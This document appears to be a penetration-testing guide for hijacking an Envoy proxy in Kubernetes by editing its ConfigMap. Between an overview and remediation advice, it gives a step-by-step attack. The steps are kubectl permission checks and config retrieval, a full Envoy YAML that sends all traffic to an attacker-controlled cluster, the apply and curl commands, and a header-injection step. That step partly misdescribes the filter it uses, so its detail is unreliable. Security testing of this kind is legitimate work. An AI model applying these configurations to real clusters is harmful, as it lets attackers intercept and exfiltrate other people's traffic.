# Kubernetes Penetration Testing: Envoy Proxy Configuration Manipulation

## 1. Overview Section

**Attack Vector Description:**

An attacker, having gained sufficient privileges (e.g., through compromised RBAC roles, insecure host access, or application-level flaws allowing interaction with the Envoy configuration), can manipulate the Envoy proxy's configuration. This manipulation can redirect traffic, inject malicious code into responses, or even completely disrupt service availability.  The attacker essentially hijacks the Envoy proxy to achieve their malicious goals.

**Potential Impact and Consequences:**

The potential impact of Envoy proxy configuration manipulation is severe and far-reaching:

*   **Data Exfiltration:** Redirect sensitive traffic destined for backend services to an attacker-controlled endpoint.
*   **Denial of Service (DoS):** Disrupt traffic flow, causing service unavailability.
*   **Code Injection:** Inject malicious code into HTTP responses, potentially compromising clients interacting with the service.
*   **Privilege Escalation:**  Gain access to internal services that were previously protected by the Envoy proxy.
*   **Complete System Compromise:**  If the manipulated Envoy proxy is critical for routing and authentication, compromise of the proxy can effectively lead to control over the entire Kubernetes cluster.

**Risk Level Assessment:**

**Critical**

**Technical Explanation of Why This Vulnerability Exists:**

The vulnerability exists because of the following reasons:

1.  **Insecure Configuration Management:** The process of updating and managing Envoy configurations might lack sufficient security controls, such as proper access control, input validation, and auditing.  If the configuration source (e.g., a Kubernetes ConfigMap) is writable by unauthorized entities, manipulation becomes trivial.
2.  **Insufficient RBAC:** Overly permissive Role-Based Access Control (RBAC) policies can grant unauthorized users or service accounts the ability to modify Envoy configurations.
3.  **Lack of Configuration Validation:** Envoy might not adequately validate new configurations, allowing malicious or malformed settings to be applied.  This lack of validation could allow the insertion of configurations that achieve the malicious purposes.
4.  **Configuration Management Plane Weakness:** Weaknesses in the control plane responsible for pushing updates to Envoy instances can be exploited.  This may involve exploiting a management API, or other communication channels.

**Prerequisites and Conditions Needed:**

*   **Sufficient Privileges:**  The attacker needs to have sufficient permissions within the Kubernetes cluster to modify Envoy proxy configurations. This can be achieved through compromised RBAC roles, compromised node access, or application vulnerabilities. At a minimum, the attacker will need `get`, `update`, and `patch` permissions on the specific Kubernetes resource (e.g., ConfigMap, Custom Resource Definition) used to manage the Envoy configuration.
*   **Knowledge of Envoy Configuration:** The attacker needs a basic understanding of how Envoy is configured within the cluster and how to manipulate its configuration files (usually YAML).
*   **Access to Kubernetes API:** The attacker needs access to the Kubernetes API (e.g., via `kubectl`).

## 2. Validation and Exploitation Steps Section

This section demonstrates how to validate and exploit the Envoy proxy configuration manipulation vulnerability using `kubectl`. The example assumes that Envoy's configuration is managed via a Kubernetes ConfigMap named `envoy-config`. This is a common practice.

**Validation Phase:**

**Step 1: Verify Access to ConfigMap**

```bash
kubectl auth can-i get configmaps/envoy-config
```

**Explanation:** This command checks if the current user or service account has the `get` permission on the `envoy-config` ConfigMap.

**Expected Output:**

```
yes
```

If the output is `no`, the user does not have sufficient permissions to read the ConfigMap. The attack is not possible without reading the existing configuration.

**Step 2: Check for Update/Patch Permission**

```bash
kubectl auth can-i update configmaps/envoy-config
kubectl auth can-i patch configmaps/envoy-config
```

**Explanation:** These commands check if the current user has the `update` or `patch` permission on the `envoy-config` ConfigMap. `update` replaces the entire object, while `patch` allows modifying specific fields. `patch` is commonly used.

**Expected Output:**

```
yes
yes
```

If the output is `no` for both `update` and `patch`, the user does not have sufficient permissions to modify the ConfigMap directly.  However, indirect modification may be possible if the ConfigMap is synced by a controller that the user *does* control.

**Step 3: Retrieve the Existing Envoy Configuration**

```bash
kubectl get configmap envoy-config -o yaml > envoy-config.yaml
```

**Explanation:** This command retrieves the contents of the `envoy-config` ConfigMap and saves it to a file named `envoy-config.yaml`.

**Expected Output:**  A YAML file containing the Envoy configuration is created locally.  Inspect the `envoy-config.yaml` file to understand the existing routing rules, filters, and other configuration parameters.

**Exploitation Phase:**

**Step 4: Modify the Configuration to Redirect Traffic**

Let's assume we want to redirect traffic destined for the service `backend-service` to a malicious service `attacker-service`. We'll modify the relevant routing rule within the `envoy-config.yaml` file. This requires knowledge of the Envoy configuration format. The example assumes that `backend-service` is specified in a VirtualHost route.

```yaml
# envoy-config.yaml (example modification)
apiVersion: v1
kind: ConfigMap
metadata:
  name: envoy-config
data:
  envoy.yaml: |
    static_resources:
      listeners:
      - address:
          socket_address:
            address: 0.0.0.0
            port_value: 80
        filter_chains:
        - filters:
          - name: envoy.filters.network.http_connection_manager
            typed_config:
              "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
              stat_prefix: ingress_http
              route_config:
                name: local_route
                virtual_hosts:
                - name: backend_vhost
                  domains:
                  - "*"
                  routes:
                  - match:
                      prefix: "/"
                    route:
                      cluster: attacker-service # Modified: Redirect to attacker-service
              http_filters:
              - name: envoy.filters.http.router
                typed_config: {}
      clusters:
      - name: backend-service  # This is the original service, now unused.
        connect_timeout: 0.25s
        type: STRICT_DNS
        lb_policy: ROUND_ROBIN
        load_assignment:
          cluster_name: backend-service
          endpoints:
          - lb_endpoints:
            - endpoint:
                address:
                  socket_address:
                    address: backend-service # Replace with backend-service's FQDN or IP
                    port_value: 8080
      - name: attacker-service # Add the attacker service
        connect_timeout: 0.25s
        type: STRICT_DNS
        lb_policy: ROUND_ROBIN
        load_assignment:
          cluster_name: attacker-service
          endpoints:
          - lb_endpoints:
            - endpoint:
                address:
                  socket_address:
                    address: attacker-service # Replace with attacker-service's FQDN or IP
                    port_value: 8080

```

**Explanation:** This YAML fragment modifies the `envoy-config.yaml` file.  It changes the `cluster` field in the routing rule to point to `attacker-service` instead of `backend-service`. Ensure that an `attacker-service` cluster exists and routes to a service you control.  The example YAML adds a cluster definition for `attacker-service` to handle the routed traffic. Replace the placeholder `attacker-service` and `backend-service` addresses with the actual FQDN or IP addresses of the attacker and legitimate backends, respectively.

**Step 5: Apply the Modified Configuration**

```bash
kubectl apply -f envoy-config.yaml
```

**Explanation:** This command applies the modified `envoy-config.yaml` to the Kubernetes cluster, updating the `envoy-config` ConfigMap.

**Expected Output:**

```
configmap/envoy-config configured
```

**Step 6: Verify Traffic Redirection**

Send a request to the service that is routed through the Envoy proxy and observe the response.

```bash
curl <service-endpoint>
```

**Explanation:** This command sends a request to the service endpoint that should have been routed to `backend-service`.

**Expected Output:** If the manipulation was successful, the response will come from the `attacker-service` instead of `backend-service`. The content will reflect the `attacker-service` response.  This confirms that the Envoy proxy is now routing traffic to the attacker-controlled endpoint.

**Step 7 (Optional): Inject Malicious Headers**

You can also inject malicious headers into requests or responses by adding filters to the Envoy configuration.  For example, the following config snippet could add a header to all outgoing requests. This would require modifications to the `http_filters` section:

```yaml
      http_filters:
      - name: envoy.filters.http.header_to_metadata
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.http.header_to_metadata.v3.Config
          request_rules:
          - header: "X-Custom-Header"
            on_present:
              metadata_namespace: envoy.http_router
              key: custom_header_value
              remove: false
      - name: envoy.filters.http.router
        typed_config: {}
```

This example configures Envoy to add an `X-Custom-Header` to outgoing requests.  The header is copied to the internal metadata.

Then, to add the actual value, modify the route to inject the header:

```yaml
                  routes:
                  - match:
                      prefix: "/"
                    route:
                      cluster: backend-service
                      request_headers_to_add:
                        - header:
                            key: "X-Custom-Header"
                            value: "Injected Header Value"
                          append: false

```

**Step 8: Revert the Configuration**

After testing, it's crucial to revert the changes to restore normal service functionality.

```bash
kubectl apply -f envoy-config.yaml # Replace envoy-config.yaml with the original configuration
```

**Explanation:** This command applies the original, uncompromised configuration to the `envoy-config` ConfigMap.

**Expected Output:**

```
configmap/envoy-config configured
```

**Remediation Recommendations:**

1.  **Implement Least Privilege RBAC:**  Restrict access to Envoy configuration resources (ConfigMaps, Custom Resources, etc.) to only those users and service accounts that absolutely require it.
2.  **Implement Configuration Validation:**  Implement validation checks on Envoy configurations before they are applied to the proxy. This can be done using webhooks or custom validation logic.
3.  **Secure Configuration Management Plane:** Secure the control plane responsible for managing Envoy configurations.  Use authentication, authorization, and encryption to protect communication channels.
4.  **Enable Auditing:** Enable auditing of all configuration changes made to Envoy proxies.  Monitor audit logs for suspicious activity.
5.  **Use Immutable Infrastructure:**  Use immutable infrastructure principles to prevent unauthorized modifications to Envoy configurations.
6.  **Implement Network Policies:** Utilize Network Policies to restrict communication between pods and the Envoy proxy, limiting the potential impact of a compromised Envoy instance.
7.  **Regularly Rotate Credentials:**  Regularly rotate credentials used to access the Kubernetes API and other sensitive resources.
8.  **Monitor Envoy Metrics:** Monitor Envoy's metrics for anomalies, such as unexpected traffic patterns or high error rates, which could indicate a compromised configuration.
